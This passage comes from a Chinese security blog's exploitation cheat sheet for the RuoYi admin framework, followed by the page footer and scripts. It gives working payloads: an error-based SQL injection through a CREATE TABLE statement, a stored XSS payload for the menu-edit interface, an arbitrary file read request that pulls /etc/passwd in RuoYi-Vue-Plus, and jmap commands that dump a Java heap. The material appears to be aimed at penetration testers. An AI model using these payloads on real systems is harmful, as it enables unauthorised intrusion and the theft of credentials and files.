+</span></span></span><span class="line"><span class="cl"><span class="cm">sql=CREATE+table+ss1+as+SELECT/**/</span><span class="o">*+</span><span class="n">FROM</span><span class="o">+</span><span class="n">sys_job</span><span class="o">+</span><span class="n">WHERE</span><span class="o">+</span><span class="n">1</span><span class="o">=</span><span class="n">1</span><span class="o">+</span><span class="n">union</span><span class="cm">/**/</span><span class="n">SELECT</span><span class="cm">/**/</span><span class="n">extractvalue</span><span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="n">0x7e</span><span class="p">,(</span><span class="n">select</span><span class="cm">/**/</span><span class="n">version</span><span class="p">()),</span><span class="n">0x7e</span><span class="p">));</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/33.png"
+	width="2534"
+	height="1006"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/33_hu6102f9336461b8f3d03a7b39b18d95bd_526633_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/33_hu6102f9336461b8f3d03a7b39b18d95bd_526633_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="251"
+		data-flex-basis="604px"
+	
+></p>
+<h3 id="212ruoyi481-后台存储型xss">2.12.ruoyi&lt;=4.8.1 后台存储型XSS
+</h3><p><strong>影响版本：Ruoyi&lt;=4.8.1</strong></p>
+<p><strong>影响接口：/system/menu/edit  修改菜单接口</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">payload</span><span class="err">：</span><span class="o">&lt;</span><span class="n">img</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="s">&#34;&amp;#34 onerror=&amp;#34alert(&#39;xss&#39;)&#34;</span><span class="o">&gt;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/34.png"
+	width="2039"
+	height="1229"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/34_hu16cfc25311a820940d16d9bebd03979c_190865_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/34_hu16cfc25311a820940d16d9bebd03979c_190865_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="165"
+		data-flex-basis="398px"
+	
+></p>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/35.png"
+	width="2026"
+	height="991"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/35_hu7fbf19d11ea2cfb1b4c61cce2ff979f8_117157_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/35_hu7fbf19d11ea2cfb1b4c61cce2ff979f8_117157_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="204"
+		data-flex-basis="490px"
+	
+></p>
+<h3 id="213ruoyi-vue-plus-sendmessagewithattachment任意文件读取漏洞">2.13.RuoYi-Vue-Plus sendMessageWithAttachment任意文件读取漏洞
+</h3><p><strong>影响版本：RuoYi-Vue-Plus，不是原生Ruoyi</strong></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/vYKU43X-RFW1TsCi74QEQQ"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/vYKU43X-RFW1TsCi74QEQQ</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">/</span><span class="n">demo</span><span class="o">/</span><span class="n">mail</span><span class="o">/</span><span class="n">sendMessageWithAttachment</span><span class="o">?</span><span class="n">to</span><span class="o">=</span><span class="n">test111</span><span class="nd">@163.com</span><span class="o">&amp;</span><span class="n">subject</span><span class="o">=</span><span class="n">Test</span><span class="o">-</span><span class="n">Mail</span><span class="o">&amp;</span><span class="n">text</span><span class="o">=</span><span class="n">This</span><span class="o">%</span><span class="n">20is</span><span class="o">%</span><span class="n">20a</span><span class="o">%</span><span class="n">20test</span><span class="o">%</span><span class="n">20message</span><span class="o">&amp;</span><span class="n">filePath</span><span class="o">=/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="214其它漏洞">2.14.其它漏洞
+</h3><p>可在Ruoyi项目的Github中查看</p>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/36.png"
+	width="2146"
+	height="1220"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/36_hu83544e0fcec968123f840688787e8c2a_215129_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/36_hu83544e0fcec968123f840688787e8c2a_215129_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="175"
+		data-flex-basis="422px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">jps</span><span class="w"> </span><span class="c1">//找进程</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">jmap</span><span class="w"> </span><span class="o">-</span><span class="n">dump</span><span class="p">:</span><span class="n">live</span><span class="p">,</span><span class="n">format</span><span class="o">=</span><span class="n">b</span><span class="p">,</span><span class="n">file</span><span class="o">=</span><span class="n">heapdump_10548</span><span class="p">.</span><span class="na">hprof</span><span class="w"> </span><span class="n">10548</span><span class="w"> </span><span class="c1">//导出 java进程的 heapdump</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>By Lsec</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Dec 30, 2025 15:26 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/jadx-ai-mcp/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">JADX AI MCP</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/next.js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/logo.png" loading="lazy" data-key="" data-hash="/logo.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Next.js常见漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/urldns%E9%93%BE%E7%AE%80%E4%BB%8B%E4%B8%8Eshiro%E6%9C%89key%E6%97%A0%E9%93%BE%E5%88%A9%E7%94%A8/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">URLDNS链简介与Shiro有key无链利用</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/burp-ai-assistant/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Burp AI Assistant</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/logo.png" loading="lazy" data-key="" data-hash="/logo.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">帆软常见漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Lsec&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>���¹鵵ҳ</title>
+    
+    <script defer src="https://cn.vercount.one/js"></script>
+</head>
+<body>
+</body>
+</html>
+    </body>
+</html>
